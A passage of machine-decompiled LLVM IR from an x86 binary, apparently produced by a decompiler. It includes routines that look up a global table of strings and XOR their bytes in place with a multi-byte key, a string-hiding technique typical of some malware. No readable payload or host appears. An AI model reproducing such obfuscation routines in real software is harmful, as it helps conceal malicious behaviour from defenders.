  %v3_8051228 = load i32, i32* %v2_8051228, align 4
  store i32 %v3_8051228, i32* %ecx.global-to-local, align 4
  %v1_805122c = add i32 %v3_8051228, 13
  %v2_805122c = inttoptr i32 %v1_805122c to i8*
  %v3_805122c = load i8, i8* %v2_805122c, align 1
  %v4_805122c = zext i8 %v3_805122c to i32
  %v5_805122c = load i32, i32* %eax.global-to-local, align 4
  %v6_805122c = and i32 %v5_805122c, -256
  %v7_805122c = or i32 %v6_805122c, %v4_805122c
  store i32 %v7_805122c, i32* %eax.global-to-local, align 4
  %v2_805122f = add i32 %v0_805121e, 24
  %v3_805122f = inttoptr i32 %v2_805122f to i32*
  store i32 %v7_805122c, i32* %v3_805122f, align 4
  %v0_8051230 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051230 = add i32 %v0_8051230, 4
  %v2_8051230 = inttoptr i32 %v1_8051230 to i32*
  %v3_8051230 = load i32, i32* %v2_8051230, align 4
  store i32 %v3_8051230, i32* %eax.global-to-local, align 4
  %v2_8051233 = add i32 %v0_805121e, 20
  %v3_8051233 = inttoptr i32 %v2_8051233 to i32*
  store i32 %v3_8051230, i32* %v3_8051233, align 4
  %v1_8051234 = add i32 %v0_805121e, 64
  %v2_8051234 = inttoptr i32 %v1_8051234 to i32*
  %v3_8051234 = load i32, i32* %v2_8051234, align 4
  store i32 %v3_8051234, i32* %eax.global-to-local, align 4
  %v2_8051238 = add i32 %v0_805121e, 16
  %v3_8051238 = inttoptr i32 %v2_8051238 to i32*
  store i32 %v3_8051234, i32* %v3_8051238, align 4
  %v0_8051239 = call i32 @function_8052934()
  store i32 %v0_8051239, i32* %eax.global-to-local, align 4
  %v0_805123e = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051161

; uselistorder directives
  uselistorder i64 %v8_80510ff, { 1, 0 }
  uselistorder i32 %v1_80510f2, { 1, 0 }
  uselistorder i32* %v2_80502ee, { 1, 0 }
  uselistorder i32 %v2_8050fbb, { 1, 0 }
  uselistorder i32 %v3_8050fb8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050f54, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8050f53, { 1, 0, 2 }
  uselistorder i16 %v1_8050f5f, { 1, 0 }
  uselistorder i64 %v8_8050f40, { 1, 0 }
  uselistorder i32 %v3_8050ed3, { 1, 0 }
  uselistorder i32 %v0_8050ed3, { 1, 0 }
  uselistorder i32 %v0_8050ecb, { 1, 0 }
  uselistorder i32 %v1_8050dd8, { 1, 2, 0 }
  uselistorder i32 %v1_8050d5f, { 1, 2, 0 }
  uselistorder i32 %v1_8050ce6, { 1, 2, 0 }
  uselistorder i32 %v1_8050c6d, { 1, 2, 0 }
  uselistorder i32 %v0_8050c27, { 1, 0 }
  uselistorder i32 %v0_8050bd6, { 1, 0 }
  uselistorder i32 %v0_8051057, { 1, 0 }
  uselistorder i32 %v7_8050b28, { 1, 0 }
  uselistorder i32 %v0_8050b28, { 1, 2, 0 }
  uselistorder i32 %v6_8050b1b, { 1, 0 }
  uselistorder i32 %v0_8050b1b, { 0, 2, 1 }
  uselistorder i32 %v6_8050b0e, { 1, 0 }
  uselistorder i32 %v2_8050afa, { 1, 0, 2 }
  uselistorder i32 %v1_8050af7, { 1, 0, 2 }
  uselistorder i32 %v0_8050af4, { 1, 0 }
  uselistorder i32 %v0_8050af0, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v2_805066d, { 1, 0 }
  uselistorder i32 %v0_805066d, { 1, 2, 4, 3, 0 }
  uselistorder i32 %v1_805066d, { 0, 2, 1 }
  uselistorder i32 %v0_80506eb128, { 1, 0 }
  uselistorder i32 %v1_8050a70, { 2, 1, 0 }
  uselistorder i32 %v9_8050a3f, { 1, 0 }
  uselistorder i32 %v0_8050ce6, { 0, 1, 3, 2 }
  uselistorder i32 %v9_80509ac, { 1, 0 }
  uselistorder i32 %v1_80509a5, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_80509a5, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_805097c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8050956, { 1, 2, 0 }
  uselistorder i32 %v1_8050956, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8050951, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v0_8050927, { 1, 0, 2 }
  uselistorder i32 %v0_80508fb, { 0, 2, 1 }
  uselistorder i32 %v0_80508d4, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32* %v1_8050e5b, { 0, 2, 1 }
  uselistorder i32 %v0_805088b, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_8050862, { 2, 1, 0 }
  uselistorder i32 %v9_8050831, { 1, 0 }
  uselistorder i32 %v0_8050c6d, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805081d, { 2, 1, 0 }
  uselistorder i32 %v9_80507ec, { 1, 0 }
  uselistorder i32 %v0_8050d5f, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80507c2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80507b2, { 2, 1, 0 }
  uselistorder i32 %v9_805078a, { 1, 0 }
  uselistorder i32 %v0_8050c1b, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8050765, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8050747, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8050742, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050732, { 2, 1, 0 }
  uselistorder i32 %v9_8050701, { 1, 0 }
  uselistorder i32 %v0_8050bca, { 0, 1, 3, 2 }
  uselistorder i32 %v2_80506df, { 1, 0 }
  uselistorder i32 %v0_80506df, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_80506d9, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80506d9, { 0, 2, 1 }
  uselistorder i32 %v0_80506d4, { 1, 0 }
  uselistorder i32 %v0_80506af, { 1, 0, 2 }
  uselistorder i32 %v1_8050696, { 1, 0, 2 }
  uselistorder i32 %v1_805067a, { 1, 0, 2 }
  uselistorder i32 %v0_8050a90, { 1, 0, 2 }
  uselistorder i32 %v0_8050a7b, { 3, 0, 1, 2 }
  uselistorder i32 %v0_80506eb129, { 3, 0, 1, 2 }
  uselistorder i32 %v2_805066d18, { 1, 0 }
  uselistorder i32 %v3_8050654, { 1, 0 }
  uselistorder i32 %v0_8050654, { 7, 21, 8, 19, 9, 18, 10, 20, 11, 16, 12, 15, 0, 14, 22, 17, 13, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v1_805063f, { 0, 2, 1 }
  uselistorder i32 %v0_805063b, { 1, 0 }
  uselistorder i32 %v0_8050622, { 1, 4, 0, 2, 3, 5 }
  uselistorder i32 %v1_8050618, { 1, 0 }
  uselistorder i32 %v1_80505df, { 2, 1, 0 }
  uselistorder i32 %v9_80505ae, { 1, 0 }
  uselistorder i32 %v0_8050dd8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805059a, { 1, 0 }
  uselistorder i32 %v0_805059a, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8050579, { 1, 0 }
  uselistorder i32 %v2_8050576, { 1, 0 }
  uselistorder i32 %v0_8050574, { 1, 0 }
  uselistorder i32 %v0_8050561, { 2, 1, 0 }
  uselistorder i32 %v1_805055e, { 1, 0 }
  uselistorder i32 %v2_805055b, { 1, 0 }
  uselistorder i32 %v3_805054f, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v2_80504fa, { 1, 0 }
  uselistorder i32 %v1_80504da, { 1, 0 }
  uselistorder i32 %v0_80504da, { 0, 2, 3, 1 }
  uselistorder i32 %v2_80504c5, { 1, 0 }
  uselistorder i32 %v3_80504c2, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8050fad, { 1, 0 }
  uselistorder i32 %v1_8050faa, { 2, 1, 0 }
  uselistorder i32 %v3_805048a, { 1, 0, 2 }
  uselistorder i32 %v2_8050488, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_805042d, { 1, 0 }
  uselistorder i32 %v1_8050422, { 1, 0 }
  uselistorder i32 %v0_8050422, { 1, 0 }
  uselistorder i32 %v0_805042b, { 0, 3, 2, 1 }
  uselistorder i32 %v1_80503ff, { 1, 0 }
  uselistorder i32 %v0_80503ff, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v6_80503f1, { 1, 0, 2 }
  uselistorder i32 %v4_80503b4, { 1, 2, 0 }
  uselistorder i32 %v3_8050383, { 1, 0, 2 }
  uselistorder i32 %v0_8050307, { 0, 2, 1 }
  uselistorder i32 %v0_80502fe, { 0, 3, 2, 1 }
  uselistorder i32 %v0_80500c565, { 1, 0 }
  uselistorder i32 %v0_80502e1, { 2, 1, 0 }
  uselistorder i8 %v1_80502b3, { 1, 0 }
  uselistorder i8 %v2_805028d, { 0, 4, 5, 6, 7, 8, 10, 9, 3, 2, 1 }
  uselistorder i32 %v2_8050284, { 4, 8, 6, 1, 0, 2, 3, 5, 7 }
  uselistorder i32 %v5_8050282, { 3, 2, 5, 4, 1, 0 }
  uselistorder i32 %v1_805027c, { 3, 0, 1, 2 }
  uselistorder i32 %v1_8050277, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805022b, { 1, 0 }
  uselistorder i32 %v0_805017b, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8050176, { 1, 0 }
  uselistorder i32 %v1_8050153, { 0, 2, 1 }
  uselistorder i32 %v0_80500b3, { 2, 0, 1 }
  uselistorder i32 %v0_8050077, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 8, 9, 10, 34, 36, 29, 37, 19, 0, 17, 21, 22, 23, 25, 26, 27, 38, 39, 40, 30, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 18, 20, 24, 28, 31, 32, 33, 41, 42, 55, 54, 43, 35, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %ecx.global-to-local, { 2, 3, 4, 5, 17, 18, 19, 20, 21, 22, 14, 23, 24, 8, 0, 7, 9, 15, 1, 25, 6, 10, 11, 12, 13, 16, 26, 39, 40, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %eax.global-to-local, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 44, 42, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 55, 127, 56, 138, 139, 57, 140, 141, 142, 143, 144, 146, 147, 148, 149, 150, 151, 152, 153, 154, 121, 122, 123, 58, 59, 60, 61, 62, 63, 155, 156, 157, 158, 159, 160, 89, 90, 91, 92, 93, 94, 95, 0, 1, 2, 3, 4, 5, 80, 81, 82, 83, 84, 85, 86, 98, 99, 100, 101, 102, 106, 107, 108, 109, 110, 111, 112, 113, 166, 167, 168, 169, 181, 133, 170, 171, 172, 173, 124, 134, 125, 126, 128, 129, 130, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 161, 162, 163, 164, 165, 65, 68, 66, 67, 69, 70, 71, 72, 73, 64, 74, 75, 76, 77, 78, 79, 87, 88, 96, 97, 103, 104, 105, 114, 115, 116, 117, 118, 119, 120, 131, 132, 135, 136, 137, 174, 175, 176, 177, 178, 179, 180, 182, 230, 231, 232, 228, 229, 233, 223, 224, 225, 226, 227, 183, 184, 185, 186, 187, 188, 189, 190, 191, 145, 192, 197, 193, 194, 195, 196, 198, 199, 200, 201, 202, 203, 204, 205, 54, 220, 222, 221, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219 }
  uselistorder i32 (i32)* @function_804f300, { 1, 0 }
  uselistorder i32 ()* @function_8052860, { 1, 0 }
  uselistorder i32 1864, { 1, 2, 0, 3 }
  uselistorder i8 31, { 0, 2, 3, 1 }
  uselistorder i32 1888, { 4, 0, 1, 2, 3 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 1, 0, 2 }
  uselistorder i32 ()* @function_805221f, { 1, 0 }
  uselistorder i32 1872, { 0, 2, 1 }
  uselistorder i32 (i8)* @function_8051280, { 2, 3, 8, 7, 0, 6, 1, 5, 4, 9, 10, 32, 33, 34, 35, 36, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 37, 38, 39, 40 }
  uselistorder i32 (i32, i32*)* @function_8051250, { 2, 3, 8, 7, 0, 6, 1, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 48, 37, 38, 39, 54, 55, 56, 57, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 53 }
  uselistorder i32 1880, { 0, 1, 2, 3, 4, 5, 10, 8, 6, 9, 7 }
  uselistorder i32 (i8)* @function_8051300, { 2, 3, 8, 7, 0, 6, 1, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i8 ptrtoint (i32* @0 to i8), { 11, 12, 13, 14, 0, 1, 6, 7, 8, 9, 2, 3, 4, 5, 15, 16, 10, 17 }
  uselistorder i32 ()* @function_8051d00, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 3, 2, 1, 13, 12, 11, 10, 9, 8, 0, 7, 6, 5, 4 }
  uselistorder i32 ()* @function_8052934, { 21, 20, 19, 18, 17, 16, 15, 6, 5, 3, 2, 12, 11, 25, 24, 14, 13, 10, 9, 8, 7, 23, 22, 4, 1, 0 }
  uselistorder i8 -5, { 0, 3, 1, 2 }
  uselistorder i8 -3, { 6, 7, 8, 2, 0, 1, 3, 4, 5 }
  uselistorder i8 65, { 1, 0 }
  uselistorder i32 ()* @function_80528be, { 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 5, 3, 2, 4, 0, 1, 6 }
  uselistorder i8 35, { 6, 4, 3, 5, 1, 0, 2 }
  uselistorder i8 36, { 6, 4, 3, 5, 1, 0, 2, 7 }
  uselistorder i8 62, { 7, 4, 5, 3, 6, 1, 0, 2 }
  uselistorder i8 58, { 7, 4, 5, 3, 6, 1, 0, 2, 8, 9 }
  uselistorder i32 (i32*)* @function_80524b2, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 ()* @function_80523f8, { 2, 1, 0 }
  uselistorder i32 1572, { 1, 2, 0 }
  uselistorder i32 1700, { 2, 0, 1 }
  uselistorder i32 ()* @function_804f800, { 2, 3, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i8 6, { 0, 3, 4, 5, 6, 2, 7, 1 }
  uselistorder i32 ()* @function_80528f1, { 1, 0 }
  uselistorder i32 -28, { 3, 2, 4, 5, 6, 0, 1 }
  uselistorder i32 -24, { 1, 0, 2, 3, 4 }
  uselistorder i32 -20, { 2, 1, 3, 4, 0, 5 }
  uselistorder i8 -1, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -15, { 1, 0 }
  uselistorder i32 (i32)* @function_804f070, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1844, { 1, 0, 2 }
  uselistorder i16* @global_var_8056916.38, { 1, 0 }
  uselistorder i8 -58, { 1, 0 }
  uselistorder i8 -87, { 1, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 1868, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051177, { 1, 0 }
  uselistorder label %dec_label_pc_8050f6b, { 1, 0 }
  uselistorder label %dec_label_pc_8050b58, { 1, 0 }
  uselistorder label %dec_label_pc_8050a83, { 8, 4, 0, 3, 5, 6, 1, 2, 7 }
  uselistorder label %dec_label_pc_805066d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8050a3f, { 1, 0 }
  uselistorder label %dec_label_pc_80509c6, { 1, 0 }
  uselistorder label %dec_label_pc_8050996, { 1, 0 }
  uselistorder label %dec_label_pc_805095c, { 1, 0 }
  uselistorder label %dec_label_pc_8050951, { 3, 4, 10, 6, 1, 5, 7, 8, 0, 2, 11, 9 }
  uselistorder label %dec_label_pc_8050831, { 1, 0 }
  uselistorder label %dec_label_pc_80507ec, { 1, 0 }
  uselistorder label %dec_label_pc_80507b5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805078a, { 1, 0 }
  uselistorder label %dec_label_pc_8050735, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050701, { 1, 0 }
  uselistorder label %dec_label_pc_80506e3, { 5, 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_80506c2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80506af, { 1, 0 }
  uselistorder label %dec_label_pc_805069d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050671, { 1, 0 }
  uselistorder label %dec_label_pc_8050671.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050644, { 1, 0 }
  uselistorder label %dec_label_pc_805063f, { 1, 0 }
  uselistorder label %dec_label_pc_80505fd, { 1, 0 }
  uselistorder label %dec_label_pc_80505e9, { 1, 0 }
  uselistorder label %dec_label_pc_80505e2.loopexit12.loopexit, { 13, 11, 4, 9, 0, 5, 6, 7, 8, 10, 12, 1, 2, 3, 14 }
  uselistorder label %dec_label_pc_80505e2.backedge, { 2, 4, 5, 3, 0, 1, 6 }
  uselistorder label %dec_label_pc_80505ae, { 1, 0 }
  uselistorder label %dec_label_pc_805058b, { 5, 6, 7, 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_8050574, { 1, 0 }
  uselistorder label %dec_label_pc_805051c, { 1, 0 }
  uselistorder label %dec_label_pc_80504cb, { 0, 3, 4, 5, 1, 6, 2 }
  uselistorder label %dec_label_pc_8050496, { 1, 0 }
  uselistorder label %dec_label_pc_8050450, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8050422, { 1, 0 }
  uselistorder label %dec_label_pc_805033b, { 10, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder label %dec_label_pc_8050330, { 1, 0 }
  uselistorder label %dec_label_pc_80502f5, { 1, 0 }
  uselistorder label %dec_label_pc_80502c1, { 1, 0 }
  uselistorder label %dec_label_pc_8050277.preheader, { 16, 14, 13, 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 15 }
  uselistorder label %dec_label_pc_80500c5, { 1, 2, 4, 0, 3 }
}

define i32 @function_8051250(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8051250:
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* @ecx, align 4
  %v1_8051258 = icmp eq i32* %arg2, null
  %v1_805125a = mul i32 %arg1, 8
  store i32 %v1_805125a, i32* @edx, align 4
  br i1 %v1_8051258, label %dec_label_pc_8051273, label %dec_label_pc_8051269

dec_label_pc_8051269:                             ; preds = %dec_label_pc_8051250
  %v1_8051269 = add i32 %v1_805125a, add (i32 ptrtoint (i32* @global_var_80569a0.52 to i32), i32 4)
  %v2_8051269 = inttoptr i32 %v1_8051269 to i32*
  %v3_8051269 = load i32, i32* %v2_8051269, align 4
  %v1_805126c = urem i32 %v3_8051269, 65536
  store i32 %v1_805126c, i32* %arg2, align 4
  %v0_8051273.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051273

dec_label_pc_8051273:                             ; preds = %dec_label_pc_8051250, %dec_label_pc_8051269
  %v0_8051273 = phi i32 [ %v1_805125a, %dec_label_pc_8051250 ], [ %v0_8051273.pre, %dec_label_pc_8051269 ]
  %v1_8051273 = add i32 %v0_8051273, ptrtoint (i32* @global_var_80569a0.52 to i32)
  %v2_8051273 = inttoptr i32 %v1_8051273 to i32*
  %v3_8051273 = load i32, i32* %v2_8051273, align 4
  ret i32 %v3_8051273

; uselistorder directives
  uselistorder label %dec_label_pc_8051273, { 1, 0 }
}

define i32 @function_8051280(i8 %arg1) local_unnamed_addr {
dec_label_pc_8051280:
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_8051289 = zext i8 %arg1 to i32
  %v1_805128d = mul nuw nsw i32 %v4_8051289, 8
  %v2_805128d = add i32 %v1_805128d, ptrtoint (i32* @global_var_80569a0.52 to i32)
  store i32 %v2_805128d, i32* @ecx, align 4
  %v0_8051294 = load i16, i16* @global_var_805681c.53, align 2
  %v1_8051294 = sext i16 %v0_8051294 to i32
  %v1_8051299 = add i32 %v1_805128d, add (i32 ptrtoint (i32* @global_var_80569a0.52 to i32), i32 4)
  %v2_8051299 = inttoptr i32 %v1_8051299 to i16*
  %v3_8051299 = load i16, i16* %v2_8051299, align 4
  %v4_8051299 = icmp eq i16 %v3_8051299, 0
  br i1 %v4_8051299, label %dec_label_pc_80512ea, label %dec_label_pc_80512a0

dec_label_pc_80512a0:                             ; preds = %dec_label_pc_8051280
  store i32 %v1_8051294, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v2_80512a8 = udiv i32 %v1_8051294, 16777216
  %v2_80512ab = udiv i32 %v1_8051294, 256
  store i32 %v2_80512ab, i32* %edi.global-to-local, align 4
  %v5_80512ae = trunc i32 %v2_80512a8 to i8
  store i8 %v5_80512ae, i8* %stack_var_-44, align 1
  %v2_80512b1 = udiv i32 %v1_8051294, 65536
  store i32 %v2_80512b1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80512b4

dec_label_pc_80512b4:                             ; preds = %dec_label_pc_80512b4.dec_label_pc_80512b4_crit_edge, %dec_label_pc_80512a0
  %v0_80512ba = phi i32 [ %v0_80512ba.pre, %dec_label_pc_80512b4.dec_label_pc_80512b4_crit_edge ], [ %v1_8051294, %dec_label_pc_80512a0 ]
  %v0_80512b6 = phi i32 [ %v1_80512e6, %dec_label_pc_80512b4.dec_label_pc_80512b4_crit_edge ], [ 0, %dec_label_pc_80512a0 ]
  %v0_80512b4 = phi i32 [ %v0_80512de, %dec_label_pc_80512b4.dec_label_pc_80512b4_crit_edge ], [ %v2_805128d, %dec_label_pc_80512a0 ]
  %v1_80512b4 = inttoptr i32 %v0_80512b4 to i32*
  %v2_80512b4 = load i32, i32* %v1_80512b4, align 4
  %v2_80512b8 = add i32 %v2_80512b4, %v0_80512b6
  %v1_80512bc = inttoptr i32 %v2_80512b8 to i8*
  %v2_80512bc = load i8, i8* %v1_80512bc, align 1
  %v4_80512bc = trunc i32 %v0_80512ba to i8
  %v5_80512bc = xor i8 %v2_80512bc, %v4_80512bc
  store i8 %v5_80512bc, i8* %v1_80512bc, align 1
  %v0_80512be = load i32, i32* @edx, align 4
  %v0_80512c0 = load i32, i32* @ecx, align 4
  %v1_80512c0 = inttoptr i32 %v0_80512c0 to i32*
  %v2_80512c0 = load i32, i32* %v1_80512c0, align 4
  %v2_80512c2 = add i32 %v2_80512c0, %v0_80512be
  %v0_80512c4 = load i32, i32* %edi.global-to-local, align 4
  %v1_80512c6 = inttoptr i32 %v2_80512c2 to i8*
  %v2_80512c6 = load i8, i8* %v1_80512c6, align 1
  %v4_80512c6 = trunc i32 %v0_80512c4 to i8
  %v5_80512c6 = xor i8 %v2_80512c6, %v4_80512c6
  store i8 %v5_80512c6, i8* %v1_80512c6, align 1
  %v0_80512c8 = load i32, i32* @edx, align 4
  %v0_80512ca = load i32, i32* @ecx, align 4
  %v1_80512ca = inttoptr i32 %v0_80512ca to i32*
  %v2_80512ca = load i32, i32* %v1_80512ca, align 4
  %v2_80512cc = add i32 %v2_80512ca, %v0_80512c8
  %v0_80512ce = load i32, i32* %esi.global-to-local, align 4
  %v1_80512d0 = inttoptr i32 %v2_80512cc to i8*
  %v2_80512d0 = load i8, i8* %v1_80512d0, align 1
  %v4_80512d0 = trunc i32 %v0_80512ce to i8
  %v5_80512d0 = xor i8 %v2_80512d0, %v4_80512d0
  store i8 %v5_80512d0, i8* %v1_80512d0, align 1
  %v0_80512d2 = load i32, i32* @edx, align 4
  %v0_80512d4 = load i32, i32* @ecx, align 4
  %v1_80512d4 = inttoptr i32 %v0_80512d4 to i32*
  %v2_80512d4 = load i32, i32* %v1_80512d4, align 4
  %v1_80512d6 = add i32 %v0_80512d2, 1
  store i32 %v1_80512d6, i32* @edx, align 4
  %v2_80512d7 = add i32 %v2_80512d4, %v0_80512d2
  %v2_80512d9 = load i8, i8* %stack_var_-44, align 1
  %v1_80512dc = inttoptr i32 %v2_80512d7 to i8*
  %v2_80512dc = load i8, i8* %v1_80512dc, align 1
  %v5_80512dc = xor i8 %v2_80512dc, %v2_80512d9
  store i8 %v5_80512dc, i8* %v1_80512dc, align 1
  %v0_80512de = load i32, i32* @ecx, align 4
  %v1_80512de = add i32 %v0_80512de, 4
  %v2_80512de = inttoptr i32 %v1_80512de to i32*
  %v3_80512de = load i32, i32* %v2_80512de, align 4
  %v1_80512e1 = urem i32 %v3_80512de, 65536
  %v1_80512e6 = load i32, i32* @edx, align 4
  %v8_80512e8 = icmp sgt i32 %v1_80512e1, %v1_80512e6
  br i1 %v8_80512e8, label %dec_label_pc_80512b4.dec_label_pc_80512b4_crit_edge, label %dec_label_pc_80512ea.loopexit

dec_label_pc_80512b4.dec_label_pc_80512b4_crit_edge: ; preds = %dec_label_pc_80512b4
  %v0_80512ba.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80512b4

dec_label_pc_80512ea.loopexit:                    ; preds = %dec_label_pc_80512b4
  br label %dec_label_pc_80512ea

dec_label_pc_80512ea:                             ; preds = %dec_label_pc_80512ea.loopexit, %dec_label_pc_8051280
  %v0_80512f1 = phi i32 [ %v1_80512e1, %dec_label_pc_80512ea.loopexit ], [ %v1_8051294, %dec_label_pc_8051280 ]
  ret i32 %v0_80512f1

; uselistorder directives
  uselistorder i32 %v1_80512e6, { 1, 0 }
  uselistorder i32 %v1_80512e1, { 1, 0 }
  uselistorder i32 %v0_80512de, { 1, 0 }
  uselistorder i32 %v1_8051294, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_8051300(i8 %arg1) local_unnamed_addr {
dec_label_pc_8051300:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i8, align 1
  %v4_8051309 = zext i8 %arg1 to i32
  %v1_805130d = mul nuw nsw i32 %v4_8051309, 8
  %v2_805130d = add i32 %v1_805130d, ptrtoint (i32* @global_var_80569a0.52 to i32)
  store i32 %v2_805130d, i32* %ecx.global-to-local, align 4
  %v0_8051314 = load i16, i16* @global_var_805681c.53, align 2
  %v1_8051314 = sext i16 %v0_8051314 to i32
  %v1_8051319 = add i32 %v1_805130d, add (i32 ptrtoint (i32* @global_var_80569a0.52 to i32), i32 4)
  %v2_8051319 = inttoptr i32 %v1_8051319 to i16*
  %v3_8051319 = load i16, i16* %v2_8051319, align 4
  %v4_8051319 = icmp eq i16 %v3_8051319, 0
  br i1 %v4_8051319, label %dec_label_pc_805136a, label %dec_label_pc_8051320

dec_label_pc_8051320:                             ; preds = %dec_label_pc_8051300
  store i32 %v1_8051314, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8051328 = udiv i32 %v1_8051314, 16777216
  %v2_805132b = udiv i32 %v1_8051314, 256
  store i32 %v2_805132b, i32* %edi.global-to-local, align 4
  %v5_805132e = trunc i32 %v2_8051328 to i8
  store i8 %v5_805132e, i8* %stack_var_-44, align 1
  %v2_8051331 = udiv i32 %v1_8051314, 65536
  store i32 %v2_8051331, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051334

dec_label_pc_8051334:                             ; preds = %dec_label_pc_8051334.dec_label_pc_8051334_crit_edge, %dec_label_pc_8051320
  %v0_805133a = phi i32 [ %v0_805133a.pre, %dec_label_pc_8051334.dec_label_pc_8051334_crit_edge ], [ %v1_8051314, %dec_label_pc_8051320 ]
  %v0_8051336 = phi i32 [ %v1_8051366, %dec_label_pc_8051334.dec_label_pc_8051334_crit_edge ], [ 0, %dec_label_pc_8051320 ]
  %v0_8051334 = phi i32 [ %v0_805135e, %dec_label_pc_8051334.dec_label_pc_8051334_crit_edge ], [ %v2_805130d, %dec_label_pc_8051320 ]
  %v1_8051334 = inttoptr i32 %v0_8051334 to i32*
  %v2_8051334 = load i32, i32* %v1_8051334, align 4
  %v2_8051338 = add i32 %v2_8051334, %v0_8051336
  %v1_805133c = inttoptr i32 %v2_8051338 to i8*
  %v2_805133c = load i8, i8* %v1_805133c, align 1
  %v4_805133c = trunc i32 %v0_805133a to i8
  %v5_805133c = xor i8 %v2_805133c, %v4_805133c
  store i8 %v5_805133c, i8* %v1_805133c, align 1
  %v0_805133e = load i32, i32* %edx.global-to-local, align 4
  %v0_8051340 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051340 = inttoptr i32 %v0_8051340 to i32*
  %v2_8051340 = load i32, i32* %v1_8051340, align 4
  %v2_8051342 = add i32 %v2_8051340, %v0_805133e
  %v0_8051344 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051346 = inttoptr i32 %v2_8051342 to i8*
  %v2_8051346 = load i8, i8* %v1_8051346, align 1
  %v4_8051346 = trunc i32 %v0_8051344 to i8
  %v5_8051346 = xor i8 %v2_8051346, %v4_8051346
  store i8 %v5_8051346, i8* %v1_8051346, align 1
  %v0_8051348 = load i32, i32* %edx.global-to-local, align 4
